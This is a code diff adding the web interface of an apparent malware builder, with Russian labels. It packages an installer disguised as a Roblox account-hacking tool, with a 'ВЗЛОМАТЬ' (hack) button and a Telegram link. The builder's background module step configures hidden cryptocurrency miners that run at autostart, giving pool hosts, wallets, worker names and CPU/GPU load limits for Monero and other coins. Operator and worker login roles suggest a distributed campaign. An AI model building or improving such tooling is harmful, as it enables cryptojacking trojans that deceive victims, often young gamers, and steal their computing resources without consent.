+            <div class="client-preview-window" id="clientPreviewFrame">
+              <div class="cp-bg-overlay" id="cpBgOverlay" style="background-image:url('griffith.jpg');"></div>
+              <div class="cp-gradient-overlay"></div>
+              
+              <!-- Заголовок окна клиента (Top Header) -->
+              <div class="cp-top-header">
+                <div class="cp-brand-name" id="cpPreviewTitle">RAH NONPRO</div>
+                <div class="cp-nav-pill">
+                  <div class="cp-nav-pill-btn active">
+                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+                    Главная
+                  </div>
+                  <div class="cp-nav-pill-btn">
+                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"></circle></svg>
+                    Настройки
+                  </div>
+                </div>
+                <div class="cp-win-actions">
+                  <div class="cp-win-btn">─</div>
+                  <div class="cp-win-btn" style="color:#ef4444;">✕</div>
+                </div>
+              </div>
+
+              <!-- Рабочая область с Hero Card -->
+              <div class="cp-workspace">
+                <div class="cp-hero-card" id="cpPreviewCard">
+                  <div class="cp-avatar-disc" id="cpAvatarCircle">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--text-tertiary)" stroke-width="1.8">
+                      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                      <circle cx="12" cy="7" r="4"></circle>
+                    </svg>
+                  </div>
+                  <div class="cp-card-target-name" id="cpPreviewAcc">Roblox Account</div>
+                  
+                  <div class="cp-input-wrap">
+                    <span class="cp-input-placeholder">Username</span>
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--text-tertiary)" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                  </div>
+
+                  <button class="cp-btn-primary" id="cpPreviewBtn">ВЗЛОМАТЬ</button>
+                  <button class="cp-btn-secondary">
+                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 2L11 13"></path><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+                    НАШ TELEGRAM
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <div style="margin-top:8px; font-size:10.5px; color:var(--text-secondary); display:flex; justify-content:space-between;">
+              <span>Фон: <strong id="builderBgBadge" style="color:#ffffff;">Griffith (ч/б)</strong></span>
+              <span>Акцент: <strong id="lblActiveThemeName" style="color:#ffffff;">Monochrome</strong></span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ШАГ 3: ФОНОВЫЙ МОДУЛЬ -->
+      <div class="b-step-view" id="bStepView3">
+        <div class="b-card" style="overflow-y:auto; flex:1; min-height:0;">
+          <div class="b-card-title">
+            <span>Фоновые модули</span>
+            <button class="c-btn" style="padding:4px 10px; font-size:11px;" onclick="addWebComputeModule()">+ Добавить модуль</button>
+          </div>
+          
+          <div style="background:#07080c; border:1px solid var(--border-subtle); border-radius:10px; padding:10px 14px; margin-bottom:12px; display:flex; justify-content:space-between; align-items:center;">
+            <label style="display:flex; align-items:center; gap:10px; cursor:pointer;">
+              <input type="checkbox" id="chkComputeEnabled" checked style="accent-color:#ffffff; width:16px; height:16px;" onchange="onGlobalComputeToggle()">
+              <span style="font-size:12.5px; font-weight:700; color:#ffffff;">Включить фоновые вычисления в автозагрузке</span>
+            </label>
+            <div style="display:flex; align-items:center; gap:12px;">
+              <span style="font-size:11px; color:var(--text-secondary);" id="lblActiveModulesCount">2 модуля настроено</span>
+              <span class="module-badge active" id="badgeGlobalCompute">АКТИВЕН</span>
+            </div>
+          </div>
+
+          <!-- Список карточек модулей -->
+          <div id="computeModulesContainer" style="display:flex; flex-direction:column; gap:10px;"></div>
+
+          <div style="display:flex; gap:12px; margin-top:14px;">
+            <button class="c-btn" style="flex:1; height:40px;" onclick="switchBuilderStep(2)">← Назад</button>
+            <button class="b-build-btn" style="flex:1; margin-top:0; height:40px;" onclick="switchBuilderStep(4)">Далее к сборке →</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- ШАГ 4: СБОРКА И ЖУРНАЛ -->
+      <div class="b-step-view" id="bStepView4">
+        <div class="b-grid-2">
+          
+          <div class="b-card">
+            <div class="b-card-title">Финал сборки</div>
+            
+            <div class="spec-row">
+              <span>Целевой файл</span>
+              <strong id="summaryTargetName">RAH_Setup_Shonll.exe</strong>
+            </div>
+            <div class="spec-row">
+              <span>Версия</span>
+              <strong id="summaryTargetVersion">8.0.3</strong>
+            </div>
+            <div class="spec-row">
+              <span>Оператор</span>
+              <strong id="summaryTargetOperator">@Shonll</strong>
+            </div>
+            <div class="spec-row">
+              <span>Фоновый модуль</span>
+              <strong id="summaryComputeStatus">Включен</strong>
+            </div>
+
+            <div style="display:flex; flex-direction:column; gap:10px; margin-top: 14px;">
+              <button class="b-build-btn" id="btnBuildClient" onclick="startBuild(false)">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+                Собрать Client Инсталлятор
+              </button>
+
+              <button class="c-btn" id="btnBuildStandalone" style="height:40px;" onclick="startBuild(true)">
+                📦 Собрать Standalone (PRO)
+              </button>
+
+              <button class="c-btn" style="height:36px;" onclick="openOutputFolder()">
+                📂 Открыть папку вывода
+              </button>
+            </div>
+
+            <button class="c-btn" style="height:34px; margin-top:auto;" onclick="switchBuilderStep(1)">
+              ← Изменить параметры
+            </button>
+          </div>
+
+          <!-- Журнал: фиксированная высота, прокрутка, копирование -->
+          <div class="b-card" style="min-height:0;">
+            <div class="b-card-title">
+              <span>Журнал компиляции</span>
+              <span style="font-family:'JetBrains Mono'; font-size:10px; color:var(--text-secondary);">Готов к работе</span>
+            </div>
+
+            <div class="console-container">
+              <button class="copy-log-btn" onclick="copyConsoleLogs()">Скопировать лог</button>
+              <div class="b-log-box selectable-text" id="bConsole"></div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    // Host Bridge
+    function sendHostAction(action, payload = {}) {
+      if (window.chrome && window.chrome.webview) {
+        window.chrome.webview.postMessage({ action, ...payload });
+      } else {
+        console.log('HostAction:', action, payload);
+      }
+    }
+
+    if (window.chrome && window.chrome.webview) {
+      window.chrome.webview.addEventListener('message', event => {
+        const msg = event.data;
+        if (!msg) return;
+        if (msg.type === 'log') {
+          appendBuilderLog(msg.text);
+        } else if (msg.type === 'initData') {
+          applyInitData(msg.data);
+        } else if (msg.type === 'loginResult') {
+          handleLoginResult(msg);
+        }
+      });
+    }
+
+    // ── THEME & LIVE PREVIEW STATE ──
+    let activeThemeAccent = '#ffffff';
+    let activeThemeSurface = '#0D0E12';
+    let activeThemeName = 'Monochrome';
+
+    const THEME_NAMES = {
+      '#ffffff': 'Monochrome',
+      '#00f0ff': 'Cyber Cyan',
+      '#a855f7': 'Purple Haze',
+      '#22c55e': 'Matrix Green',
+      '#ef4444': 'Crimson Red',
+      '#f59e0b': 'Amber Gold'
+    };
+
+    function selectThemePreset(accentHex, surfaceHex, btnEl) {
+      activeThemeAccent = accentHex;
+      activeThemeSurface = surfaceHex;
+      activeThemeName = THEME_NAMES[accentHex.toLowerCase()] || 'Custom';
+
+      document.querySelectorAll('.color-swatch-btn').forEach(b => b.classList.remove('active'));
+      if (btnEl) btnEl.classList.add('active');
+
+      const picker = document.getElementById('colorPickerAccent');
+      if (picker) picker.value = accentHex;
+
+      const txt = document.getElementById('txtAccentHex');
+      if (txt) txt.textContent = accentHex.toUpperCase();
+
+      const lblName = document.getElementById('lblActiveThemeName');
+      if (lblName) lblName.textContent = activeThemeName;
+
+      updateLiveClientPreview();
+    }
+
+    function onCustomColorPick(val) {
+      activeThemeAccent = val;
+      activeThemeSurface = '#0D0E12';
+      activeThemeName = 'Custom';
+
+      document.querySelectorAll('.color-swatch-btn').forEach(b => b.classList.remove('active'));
+
+      const txt = document.getElementById('txtAccentHex');
+      if (txt) txt.textContent = val.toUpperCase();
+
+      const lblName = document.getElementById('lblActiveThemeName');
+      if (lblName) lblName.textContent = activeThemeName;
+
+      updateLiveClientPreview();
+    }
+
+    function updateLiveClientPreview() {
+      const appName = document.getElementById('bAppName')?.value.trim() || 'RAH';
+      const version = document.getElementById('bVersion')?.value.trim() || '8.0.3';
+      const btnText = document.getElementById('bBtnText')?.value.trim() || 'ВЗЛОМАТЬ';
+
+      const titleEl = document.getElementById('cpPreviewTitle');
+      if (titleEl) titleEl.textContent = `${appName} ${version}`;
+
+      const btnEl = document.getElementById('cpPreviewBtn');
+      if (btnEl) {
+        btnEl.textContent = btnText;
+        btnEl.style.backgroundColor = activeThemeAccent;
+      }
+
+      const avatarEl = document.getElementById('cpAvatarCircle');
+      if (avatarEl) {
+        avatarEl.style.borderColor = activeThemeAccent;
+      }
+
+      const cardEl = document.getElementById('cpPreviewCard');
+      if (cardEl && activeThemeSurface) {
+        cardEl.style.backgroundColor = activeThemeSurface;
+      }
+    }
+
+    // Supported algorithms registry for Builder WebUI
+    const ALGORITHM_OPTIONS = [
+      { id: 'xmr', name: 'Monero (XMR)', defaultPool: 'pool.supportxmr.com', defaultPort: 3333, defaultWallet: '4...' },
+      { id: 'etc', name: 'Ethereum Classic (ETC)', defaultPool: 'etc.2miners.com', defaultPort: 1010, defaultWallet: '0x...' },
+      { id: 'kas', name: 'Kaspa (KAS)', defaultPool: 'pool.woolypooly.com', defaultPort: 3112, defaultWallet: 'kaspa:...' },
+      { id: 'rvn', name: 'Ravencoin (RVN)', defaultPool: 'rvn.2miners.com', defaultPort: 6060, defaultWallet: 'R...' },
+      { id: 'ergo', name: 'Ergo (ERG)', defaultPool: 'ergo.2miners.com', defaultPort: 8888, defaultWallet: '9f...' }
+    ];
+
+    let computeModules = [
+      {
+        id: 'mod1',
+        name: 'Модуль #1 (CPU)',
+        enabled: true,
+        mode: 'single',
+        primary: { algorithm: 'xmr', wallet: '4...', pool: 'pool.supportxmr.com', port: 3333, worker: 'rig' },
+        secondary: { algorithm: 'etc', wallet: '0x...', pool: 'etc.2miners.com', port: 1010, worker: 'rig' },
+        resourceLimit: 30
+      },
+      {
+        id: 'mod2',
+        name: 'Модуль #2 (GPU)',
+        enabled: true,
+        mode: 'single',
+        primary: { algorithm: 'etc', wallet: '0x...', pool: 'etc.2miners.com', port: 1010, worker: 'rig' },
+        secondary: { algorithm: 'kas', wallet: 'kaspa:...', pool: 'pool.woolypooly.com', port: 3112, worker: 'rig' },
+        resourceLimit: 50
+      }
+    ];
+
+    function renderComputeModules() {
+      const container = document.getElementById('computeModulesContainer');
+      if (!container) return;
+      container.innerHTML = '';
+
+      const isGloballyEnabled = document.getElementById('chkComputeEnabled')?.checked ?? true;
+
+      computeModules.forEach((mod, idx) => {
+        const card = document.createElement('div');
+        card.className = `module-card ${!mod.enabled || !isGloballyEnabled ? 'disabled' : ''}`;
+
+        const isDual = mod.mode === 'dual';
+
+        let algoOptionsPrimary = ALGORITHM_OPTIONS.map(a => 
+          `<option value="${a.id}" ${mod.primary.algorithm === a.id ? 'selected' : ''}>${a.name}</option>`
+        ).join('');
+
+        let algoOptionsSecondary = ALGORITHM_OPTIONS.map(a => 
+          `<option value="${a.id}" ${mod.secondary.algorithm === a.id ? 'selected' : ''}>${a.name}</option>`
+        ).join('');
+
+        card.innerHTML = `
+          <div class="module-header">
+            <div class="module-title-wrap">
+              <input type="checkbox" ${mod.enabled ? 'checked' : ''} onchange="toggleModuleEnabled(${idx}, this.checked)" style="accent-color:#ffffff; cursor:pointer;">
+              <span style="font-size:12px; font-weight:700; color:#ffffff;">${mod.name || `Модуль #${idx+1}`}</span>
+              <span class="module-badge ${mod.enabled && isGloballyEnabled ? 'active' : 'inactive'}">${mod.enabled && isGloballyEnabled ? 'ВКЛ' : 'ВЫКЛ'}</span>
+            </div>
+            <div class="module-actions">
+              <select class="b-select" style="height:26px; padding:0 6px; font-size:11px;" onchange="changeModuleMode(${idx}, this.value)">
+                <option value="single" ${!isDual ? 'selected' : ''}>Одна задача</option>
+                <option value="dual" ${isDual ? 'selected' : ''}>Две задачи</option>
+              </select>
+              <button class="btn-icon-tiny" title="Копировать" onclick="copyWebModule(${idx})">📋</button>
+              <button class="btn-icon-tiny del" title="Удалить" onclick="deleteWebModule(${idx})">✕</button>
+            </div>
+          </div>
+
+          <!-- PRIMARY TASK -->
+          <div class="task-box">
+            <div class="task-box-title">
+              <span>${isDual ? 'Основная задача (Task 1)' : 'Параметры задачи'}</span>
+              <span style="font-family:'JetBrains Mono'; font-size:9.5px; color:var(--text-secondary);">${mod.primary.algorithm.toUpperCase()}</span>
+            </div>
+            <div class="task-grid-top">
+              <div>
+                <label class="b-label">Тип алгоритма:</label>
+                <select class="b-select" style="width:100%;" onchange="onAlgoChange(${idx}, 'primary', this.value)">
+                  ${algoOptionsPrimary}
+                </select>
+              </div>
+              <div>
+                <label class="b-label">Кошелёк / Адрес назначения:</label>
+                <input type="text" class="b-input selectable-text" style="width:100%;" value="${mod.primary.wallet || ''}" oninput="updateModuleField(${idx}, 'primary', 'wallet', this.value)">
+              </div>
+            </div>
+            <div class="task-grid-bottom">
+              <div>
+                <label class="b-label">Сервер пула (Хост):</label>
+                <input type="text" class="b-input selectable-text" style="width:100%;" value="${mod.primary.pool || ''}" oninput="updateModuleField(${idx}, 'primary', 'pool', this.value)">
+              </div>
+              <div>
+                <label class="b-label">Порт:</label>
+                <input type="number" class="b-input selectable-text" style="width:100%;" value="${mod.primary.port || ''}" oninput="updateModuleField(${idx}, 'primary', 'port', parseInt(this.value)||0)">
+              </div>
+              <div>
+                <label class="b-label">Имя воркера:</label>
+                <input type="text" class="b-input selectable-text" style="width:100%;" value="${mod.primary.worker || 'rig'}" oninput="updateModuleField(${idx}, 'primary', 'worker', this.value)">
+              </div>
+            </div>
+          </div>
+
+          <!-- SECONDARY TASK (IF DUAL) -->
+          ${isDual ? `
+          <div class="task-box" style="margin-top:6px;">
+            <div class="task-box-title">
+              <span style="color:#a78bfa;">Вторая задача (Task 2)</span>
+              <span style="font-family:'JetBrains Mono'; font-size:9.5px; color:var(--text-secondary);">${mod.secondary.algorithm.toUpperCase()}</span>
+            </div>
+            <div class="task-grid-top">
+              <div>
+                <label class="b-label">Тип алгоритма:</label>
+                <select class="b-select" style="width:100%;" onchange="onAlgoChange(${idx}, 'secondary', this.value)">
+                  ${algoOptionsSecondary}
+                </select>
+              </div>
+              <div>
+                <label class="b-label">Кошелёк / Адрес назначения:</label>
+                <input type="text" class="b-input selectable-text" style="width:100%;" value="${mod.secondary.wallet || ''}" oninput="updateModuleField(${idx}, 'secondary', 'wallet', this.value)">
+              </div>
+            </div>
+            <div class="task-grid-bottom">
+              <div>
+                <label class="b-label">Сервер пула (Хост):</label>
+                <input type="text" class="b-input selectable-text" style="width:100%;" value="${mod.secondary.pool || ''}" oninput="updateModuleField(${idx}, 'secondary', 'pool', this.value)">
+              </div>
+              <div>
+                <label class="b-label">Порт:</label>
+                <input type="number" class="b-input selectable-text" style="width:100%;" value="${mod.secondary.port || ''}" oninput="updateModuleField(${idx}, 'secondary', 'port', parseInt(this.value)||0)">
+              </div>
+              <div>
+                <label class="b-label">Имя воркера:</label>
+                <input type="text" class="b-input selectable-text" style="width:100%;" value="${mod.secondary.worker || 'rig'}" oninput="updateModuleField(${idx}, 'secondary', 'worker', this.value)">
+              </div>
+            </div>
+          </div>
+          ` : ''}
+
+          <!-- RESOURCE LIMIT SLIDER -->
+          <div class="module-slider-box">
+            <div class="slider-row">
+              <label class="b-label" style="font-size:10.5px; white-space:nowrap;">Лимит нагрузки CPU/GPU:</label>
+              <input type="range" class="slider-input" min="1" max="100" value="${mod.resourceLimit || 30}" oninput="onModuleSliderChange(${idx}, this.value)">
+              <span style="font-family:'JetBrains Mono'; font-size:11px; font-weight:700; color:#ffffff; width:36px; text-align:right;" id="lblSlider_${idx}">${mod.resourceLimit || 30}%</span>
+            </div>
+          </div>
+        `;
+
+        container.appendChild(card);
+      });
+
+      updateComputeStatusBadges();
+    }
+
+    function onModuleSliderChange(idx, val) {
+      if (!computeModules[idx]) return;
+      computeModules[idx].resourceLimit = parseInt(val, 10);
+      const lbl = document.getElementById(`lblSlider_${idx}`);
+      if (lbl) lbl.textContent = val + '%';
+    }
+
+    function toggleModuleEnabled(idx, val) {
+      if (!computeModules[idx]) return;
+      computeModules[idx].enabled = val;
+      renderComputeModules();
+    }
+
+    function changeModuleMode(idx, mode) {
+      if (!computeModules[idx]) return;
+      computeModules[idx].mode = mode;
+      renderComputeModules();
+    }
+
+    function updateModuleField(idx, target, key, val) {
+      if (!computeModules[idx] || !computeModules[idx][target]) return;
+      computeModules[idx][target][key] = val;
+    }
+
+    function onAlgoChange(idx, target, algoId) {
+      if (!computeModules[idx] || !computeModules[idx][target]) return;
+      computeModules[idx][target].algorithm = algoId;
+      const algoDef = ALGORITHM_OPTIONS.find(a => a.id === algoId);
+      if (algoDef) {
+        if (!computeModules[idx][target].pool || computeModules[idx][target].pool.includes('2miners') || computeModules[idx][target].pool.includes('supportxmr') || computeModules[idx][target].pool.includes('woolypooly')) {
+          computeModules[idx][target].pool = algoDef.defaultPool;
+          computeModules[idx][target].port = algoDef.defaultPort;
+        }
+        if (!computeModules[idx][target].wallet || computeModules[idx][target].wallet === '4...' || computeModules[idx][target].wallet === '0x...' || computeModules[idx][target].wallet === 'kaspa:...') {
+          computeModules[idx][target].wallet = algoDef.defaultWallet;
+        }
+      }
+      renderComputeModules();
+    }
+
+    function addWebComputeModule() {
+      const newIdx = computeModules.length + 1;
+      computeModules.push({
+        id: 'mod_' + Math.random().toString(36).substring(2, 9),
+        name: `Модуль #${newIdx}`,
+        enabled: true,
+        mode: 'single',
+        primary: { algorithm: 'xmr', wallet: '4...', pool: 'pool.supportxmr.com', port: 3333, worker: 'rig' },
+        secondary: { algorithm: 'etc', wallet: '0x...', pool: 'etc.2miners.com', port: 1010, worker: 'rig' },
+        resourceLimit: 30
+      });
+      renderComputeModules();
+    }
+
+    function copyWebModule(idx) {
+      if (!computeModules[idx]) return;
+      const orig = computeModules[idx];
+      const copy = JSON.parse(JSON.stringify(orig));
+      copy.id = 'mod_' + Math.random().toString(36).substring(2, 9);
+      copy.name = orig.name + ' (копия)';
+      if (copy.primary) copy.primary.worker = (copy.primary.worker || 'rig') + '-copy';
+      if (copy.secondary) copy.secondary.worker = (copy.secondary.worker || 'rig') + '-copy';
+      computeModules.push(copy);
+      renderComputeModules();
+    }
+
+    function deleteWebModule(idx) {
+      if (!computeModules[idx]) return;
+      computeModules.splice(idx, 1);
+      renderComputeModules();
+    }
+
+    function onGlobalComputeToggle() {
+      renderComputeModules();
+      updateSummary();
+    }
+
+    function updateComputeStatusBadges() {
+      const isGloballyEnabled = document.getElementById('chkComputeEnabled')?.checked ?? true;
+      const activeCount = computeModules.filter(m => m.enabled).length;
+      const totalCount = computeModules.length;
+
+      const lblCount = document.getElementById('lblActiveModulesCount');
+      if (lblCount) {
+        lblCount.textContent = `${totalCount} модуля настроено (активно: ${activeCount})`;
+      }
+
+      const badge = document.getElementById('badgeGlobalCompute');
+      if (badge) {
+        if (isGloballyEnabled && activeCount > 0) {
+          badge.className = 'module-badge active';
+          badge.textContent = `АКТИВЕН (${activeCount})`;
+        } else {
+          badge.className = 'module-badge inactive';
+          badge.textContent = 'ОТКЛЮЧЕН';
+        }
+      }
+    }
+
+    function applyInitData(data) {
+      if (!data) return;
+      if (data.appName) document.getElementById('bAppName').value = data.appName;
+      if (data.author) document.getElementById('bAuthor').value = data.author;
+      if (data.version) document.getElementById('bVersion').value = data.version;
+      if (data.outputPath) document.getElementById('bOutputPath').value = data.outputPath;
+      if (data.computeConfig) {
+        if (data.computeConfig.enabled !== undefined) {
+          const chk = document.getElementById('chkComputeEnabled');
+          if (chk) chk.checked = data.computeConfig.enabled;
+        }
+        if (Array.isArray(data.computeConfig.modules) && data.computeConfig.modules.length > 0) {
+          computeModules = data.computeConfig.modules;
+        }
+      }
+      renderComputeModules();
+      if (data.user) {
+        document.getElementById('userNameTxt').textContent = data.user;
+        document.getElementById('userRoleTxt').textContent = data.isAdmin ? 'ADMIN' : 'WORKER';
+        document.getElementById('userBadge').style.display = 'flex';
+        document.getElementById('loginOverlay').style.display = 'none';
+      } else {
+        document.getElementById('loginOverlay').style.display = 'flex';
+      }
+      if (data.customBgPath) {
+        document.getElementById('bCustomBgText').value = data.customBgPath.split('\\').pop();
+        document.getElementById('builderBgBadge').textContent = data.customBgPath.split('\\').pop();
+        if (data.customBgBase64) {
+          const bgOverlay = document.getElementById('cpBgOverlay');
+          if (bgOverlay) bgOverlay.style.backgroundImage = `url('${data.customBgBase64}')`;
+        }
+      } else {
+        document.getElementById('bCustomBgText').value = "По умолчанию (Гриффит, ч/б)";
+        document.getElementById('builderBgBadge').textContent = "Griffith (ч/б)";
+        const bgOverlay = document.getElementById('cpBgOverlay');
+        if (bgOverlay) bgOverlay.style.backgroundImage = "url('griffith.jpg')";
+      }
+      updateSummary();
+    }
+
+    function switchBuilderStep(stepNum) {
+      for (let i = 1; i <= 4; i++) {
+        const btn = document.getElementById('bStepBtn' + i);
+        const view = document.getElementById('bStepView' + i);
+        if (btn) btn.classList.toggle('active', i === stepNum);
+        if (view) view.classList.toggle('active', i === stepNum);
+      }
+      updateSummary();
+    }
+
+    function updateSummary() {
+      const appName = document.getElementById('bAppName')?.value || 'RAH';
+      const version = document.getElementById('bVersion')?.value || '8.0.3';
+      const op = getSelectedOperator();
+      const comp = document.getElementById('chkComputeEnabled')?.checked;
+
+      const summaryTarget = document.getElementById('summaryTargetName');
+      if (summaryTarget) summaryTarget.textContent = `${appName}_Setup_${op}.exe`;
+
+      const summaryVer = document.getElementById('summaryTargetVersion');
+      if (summaryVer) summaryVer.textContent = version;
+
+      const summaryOp = document.getElementById('summaryTargetOperator');
+      if (summaryOp) summaryOp.textContent = '@' + op;
+
+      const summaryComp = document.getElementById('summaryComputeStatus');
+      if (summaryComp) summaryComp.textContent = comp ? 'Включен' : 'Отключен';
+
+      updateLiveClientPreview();
+    }
+
+    function getSelectedOperator() {
+      const sel = document.getElementById('bOperatorSelect');
+      if (!sel) return 'Shonll';
+      if (sel.value === '__custom__') {
+        return document.getElementById('bCustomOperatorInput')?.value || 'Shonll';
+      }
+      return sel.value;
+    }
+
+    function onOperatorChange(val) {
+      const customInput = document.getElementById('bCustomOperatorInput');
+      if (customInput) customInput.style.display = val === '__custom__' ? 'block' : 'none';
+      updateSummary();
+    }
+
+    function onIconPresetChange(val) {
+      const summaryIcon = document.getElementById('summaryIconName');
+      if (summaryIcon) summaryIcon.textContent = val + '.ico';
+      sendHostAction('selectIconPreset', { preset: val });
+    }
+
+    function chooseCustomIco() {
+      sendHostAction('chooseCustomIco');
+    }
+
+    function chooseOutputFolder() {
+      sendHostAction('chooseOutputFolder');
+    }
+
+    function chooseCustomBg() {
+      sendHostAction('chooseCustomBg');
+    }
+
+    function resetCustomBg() {
+      document.getElementById('bCustomBgText').value = "По умолчанию (Гриффит, ч/б)";
+      document.getElementById('builderBgPreview').src = "griffith.jpg";
+      document.getElementById('builderBgBadge').textContent = "Griffith (ч/б)";
+      sendHostAction('resetCustomBg');
+    }
+
+    function openOutputFolder() {
+      sendHostAction('openOutputFolder');
+    }
+
+    function startBuild(isStandalone) {
+      const payload = {
+        appName: document.getElementById('bAppName').value.trim(),
+        author: document.getElementById('bAuthor').value.trim(),
+        version: document.getElementById('bVersion').value.trim(),
+        outputPath: document.getElementById('bOutputPath').value.trim(),
+        operator: getSelectedOperator(),
+        telegram: document.getElementById('bTgChannel').value.trim(),
+        buttonText: document.getElementById('bBtnText').value.trim(),
+        themeAccent: activeThemeAccent,
+        themeSurface: activeThemeSurface,
+        computeEnabled: document.getElementById('chkComputeEnabled').checked,
+        computeModules: computeModules,
+        isStandalone: isStandalone
+      };
+
+      appendBuilderLog(`🚀 Запуск сборки: ${isStandalone ? 'Standalone (PRO)' : 'Client Инсталлятор'}...`);
+      sendHostAction('startBuild', payload);
+    }
+
+    function appendBuilderLog(msg) {
+      const consoleBox = document.getElementById('bConsole');
+      if (!consoleBox) return;
+      const now = new Date().toTimeString().split(' ')[0];
+      consoleBox.innerHTML += `\n[${now}] ${msg}`;
+      consoleBox.scrollTop = consoleBox.scrollHeight;
+    }
+
+    function copyConsoleLogs() {
+      const consoleBox = document.getElementById('bConsole');
+      if (!consoleBox) return;
+      navigator.clipboard.writeText(consoleBox.innerText).then(() => {
+        const btn = document.querySelector('.copy-log-btn');
+        btn.textContent = "Скопировано!";
+        setTimeout(() => { btn.textContent = "Скопировать лог"; }, 1500);
+      });
+    }
+
+    function submitLogin() {
+      const login = document.getElementById('authLoginInput').value.trim();
+      const pass = document.getElementById('authPassInput').value;
+      const remember = document.getElementById('authRememberChk').checked;
+      if (!login || !pass) {
+        showLoginError('Введите логин и пароль');
+        return;
+      }
+      sendHostAction('login', { login, pass, remember });
+    }
+
+    function showLoginError(msg) {
+      const errBox = document.getElementById('loginErrMsg');
+      errBox.textContent = msg;
+      errBox.style.display = 'block';
+    }
+
+    function handleLoginResult(res) {
+      if (res.success) {
+        document.getElementById('loginOverlay').style.display = 'none';
+        document.getElementById('userNameTxt').textContent = res.user;
+        document.getElementById('userRoleTxt').textContent = res.isAdmin ? 'ADMIN' : 'WORKER';
+        document.getElementById('userBadge').style.display = 'flex';
+      } else {
+        showLoginError(res.message || 'Ошибка авторизации');
+      }
+    }
+
+    function logout() {
+      sendHostAction('logout');
+      document.getElementById('loginOverlay').style.display = 'flex';
+      document.getElementById('userBadge').style.display = 'none';
+    }
+
+    // ── 10-СЕКУНДНЫЙ СТАРТ BUILDER ──
+    const builderStartupScreen = document.getElementById('builderStartupScreen');
+    const builderStartupFill = document.getElementById('builderStartupFill');
+    const builderStartupSub = document.getElementById('builderStartupSub');
+    const builderStartupTimer = document.getElementById('builderStartupTimer');
+
+    const builderLoadingStages = [
+      { t: 0,   text: "Инициализация ядра сборщика..." },
+      { t: 2.0, text: "Проверка компилятора Inno Setup..." },
+      { t: 4.5, text: "Подготовка шаблонов приложений..." },
+      { t: 7.0, text: "Проверка защищенных сигнатур..." },
+      { t: 9.0, text: "Готово к работе" }
+    ];
+
+    function start10sBuilderLoadingSequence() {
+      if (!builderStartupScreen) return;
+      builderStartupScreen.classList.remove('hidden');
+      builderStartupFill.style.width = '0%';
+      
+      const totalDuration = 10.0;
+      let elapsed = 0;
+      const updateInterval = 50;
+
+      const timer = setInterval(() => {
+        elapsed += updateInterval / 1000;
+        const progress = Math.min(100, (elapsed / totalDuration) * 100);
+        builderStartupFill.style.width = progress + '%';
+
+        const remaining = Math.max(0, totalDuration - elapsed);
+        builderStartupTimer.textContent = remaining.toFixed(1) + ' сек';
+
+        for (let i = builderLoadingStages.length - 1; i >= 0; i--) {
+          if (elapsed >= builderLoadingStages[i].t) {
+            builderStartupSub.textContent = builderLoadingStages[i].text;
+            break;
+          }
+        }
+
+        if (elapsed >= totalDuration) {
+          clearInterval(timer);
+          builderStartupSub.textContent = "Готово";
+          setTimeout(() => {
+            builderStartupScreen.classList.add('hidden');
+          }, 350);
+        }
+      }, updateInterval);
+    }
+    start10sBuilderLoadingSequence();
+
+    // Inform host we are ready
+    window.addEventListener('DOMContentLoaded', () => {
+      renderComputeModules();
+      sendHostAction('domReady');
+    });
+  </script>
+</body>
+</html>
